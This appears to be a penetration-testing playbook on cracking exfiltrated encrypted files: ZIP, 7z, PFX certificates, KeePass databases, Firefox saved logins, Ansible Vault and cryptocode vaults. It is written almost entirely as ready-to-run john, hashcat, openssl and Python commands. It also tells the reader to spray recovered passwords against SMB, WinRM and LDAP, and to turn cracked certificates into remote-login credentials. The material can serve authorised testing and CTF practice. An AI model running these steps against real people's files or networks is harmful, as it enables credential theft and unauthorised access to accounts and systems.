# Encrypted Container Cracking (ZIP / 7z / PFX / KDBX / Vault)

## When this applies

- You've exfiltrated an encrypted file (backup ZIP, 7z, PKCS#12 cert, KeePass DB, Ansible Vault).
- Goal: recover the cleartext via offline cracking — NOT a live login attack, so allowed even on engagements that ban brute force.

## Technique

Encrypted file formats include the encrypted content + a key-derivation function over the user's passphrase. Extract the verification material with `<format>2john` / `<format>2hashcat`, then crack with John or Hashcat.

## Steps

### 1. ZIP

```bash
# Extract
zip2john backup.zip > zip.hash         # creates a $zip2$* line
john --wordlist=rockyou.txt zip.hash

# Or hashcat (mode depends on encryption):
#   13600 = WinZip (PKZIP-classic)
#   17200 = PKZIP compressed
#   17220 = PKZIP uncompressed
#   17225 = PKZIP mixed-multi-file
hashcat -m <mode> zip.hash rockyou.txt
```

### 2. 7-Zip

```bash
7z2john.pl secret.7z > 7z.hash
john --wordlist=rockyou.txt 7z.hash
# Or: hashcat -m 11600 7z.hash rockyou.txt
```

### 3. PFX / PKCS#12 (cert + private key)

```bash
pfx2john.py legacy.pfx > pfx.hash
```

`pfx2john.py` (Python port shipping with john-jumbo) emits hashes wrapped in Python `b'…'` byte-string syntax. John rejects these silently with "No password hashes loaded". Strip the wrappers:

```bash
sed -i -E "s/b'\\\\x([0-9a-f]{2})'/\\\\x\\1/g; s/b'([^']*)'/\\1/g" pfx.hash
john --wordlist=rockyou.txt pfx.hash
```

If your sed dialect rejects the regex, hex-decode the `b'\xNN'` bytes inline in Python and write the cleaned hash back.

After cracking, split into PEM cert + PEM key (no password on output):

```bash
openssl pkcs12 -in legacy.pfx -nocerts -out key.pem -nodes -passin pass:<phrase>
openssl pkcs12 -in legacy.pfx -clcerts -nokeys -out cert.pem -passin pass:<phrase>
```

These pem files plug directly into evil-winrm cert auth.

### 4. KeePass (.kdbx)

```bash
keepass2john secrets.kdbx > kdbx.hash
john --wordlist=rockyou.txt kdbx.hash       # or hashcat -m 13400
```

### 5. Firefox saved logins

Files needed (collect ALL THREE from the user's profile dir):
- `key4.db` — encryption key store (replaces older key3.db)
- `cert9.db` — NSS cert DB (some versions need this present)
- `logins.json` — encrypted credential records

Profile path:
- Windows: `%APPDATA%\Mozilla\Firefox\Profiles\<random>.default-release\`
- Linux: `~/.mozilla/firefox/<random>.default-release/`

Decrypt offline (no cracking — Firefox stores creds AES-encrypted under a key derived from the master password; default master is empty, so this is a deterministic decrypt):

```bash
git clone https://github.com/unode/firefox_decrypt /opt/firefox_decrypt
python3 /opt/firefox_decrypt/firefox_decrypt.py /tmp/profile/
```

Output: cleartext URL + username + password for every saved login. These passwords frequently match the user's AD password (cred reuse) — try them against SMB/WinRM/LDAP.

### 6. Ansible Vault

The real credentials are NOT in `inventory` files (those are template placeholders — DO NOT spray them as live AD creds). Real secrets live as `!vault` blocks inside `defaults/main.yml`, `group_vars/*.yml`, `host_vars/*.yml`, or any role's `vars/main.yml`.

Format on disk:
```yaml
password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  35663...                    # hex ciphertext, multi-line
```

**Step 1** — extract every `$ANSIBLE_VAULT` block from the spidered share:
```bash
grep -rEzo '\$ANSIBLE_VAULT;1\.1;AES256\n([0-9a-f]+\n)+' ./share/playbooks/ > vault.txt
```

**Step 2** — convert to john format and crack:
```bash
ansible2john vault.txt > vault.hash
john --wordlist=rockyou.txt vault.hash      # hashcat -m 16900
```

**Step 3** — decrypt with the recovered passphrase:
```bash
ansible-vault decrypt vault.txt --vault-password-file <(echo 'CRACKED_PWD')
```

Cleartext is usually the AD service-account password backing PWM, Ansible Tower, AWX, or whatever automation the playbook drives.

### 7. BCTextEncoder + Writeup Passphrase Reuse

`BCTextEncoder` (Jetico) produces ASCII-armored symmetric ciphertext blocks (`-----BEGIN ENCODED MESSAGE-----`). When you find one (`C:\private\encoded.txt`, `notes.txt`, share dumps), the passphrase is reused across box redeploys — public writeups for the target frequently still contain the working passphrase even after a CTF "reset".

```bash
# PyBCTextEncoder
pip install bctextencoder
bctextencoder -d -p '<pass>' < blob.txt
```

Always check writeups for the literal passphrase before launching wordlist attacks.

The broader pattern — **writeup-passphrase reuse** — applies to ANY symmetric container where the box author hard-coded a passphrase: BCTextEncoder, KeePass master keys, encrypted ZIPs, gpg-symmetric blobs, Ansible Vault on retired machines. The passphrase is part of the box's "secret material", survives resets.

### 8. Cryptocode vault (`pswm` and similar)

Format: `base64(cipher) * base64(salt) * base64(nonce) * base64(tag)` — 4 base64 segments joined with `*`. AES-GCM, key = scrypt(password, salt, n=2**14, r=8, p=1, dklen=32).

```python
import cryptocode
vault = open("pswm").read().strip()
for pw in open("/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"):
    pw = pw.rstrip()
    res = cryptocode.decrypt(vault, pw)
    if res is not False:
        print(pw, res)
        break
```

Speed: scrypt(n=2**14) ≈ 30–80 attempts/sec on CPU — 10k-most-common finishes in ~3–5 minutes.

### 9. Run john + hashcat in parallel

```bash
john --wordlist=rockyou.txt foo.hash &
hashcat -m <mode> foo.hash rockyou.txt &
wait
```

## Verifying success

- John / hashcat outputs `<hash>:<password>`.
- The passphrase decrypts the original container (ZIP extracts cleanly, PFX yields key+cert).
- The recovered key/credential is usable for the next step (cert auth, password spray, etc.).

## Common pitfalls

- `pfx2john.py` Python b'...' wrapper bug — strip before cracking.
- bcrypt/scrypt/Argon2 KDFs are intentionally slow — small wordlists only.
- Some ZIPs use AES-256 (mode 13600); legacy ZipCrypto is 17200/17220/17225 — identify which.
- Ansible inventory creds are usually placeholders; real secrets are in `!vault` blocks elsewhere.
- For long-running jobs, use `--session` to allow resume on crash.

## Tools

- `zip2john`, `7z2john`, `pfx2john`, `keepass2john`, `ansible2john` (john-jumbo).
- Hashcat with appropriate `-m` mode.
- `firefox_decrypt`, `pyBCTextEncoder`, `cryptocode`.
- `openssl pkcs12` for PFX manipulation.

## References

- MITRE ATT&CK T1552.004 (Private Keys), T1110.002 (Password Cracking).
- CWE-321 (Use of Hard-coded Cryptographic Key).
- John-jumbo formats: https://github.com/openwall/john
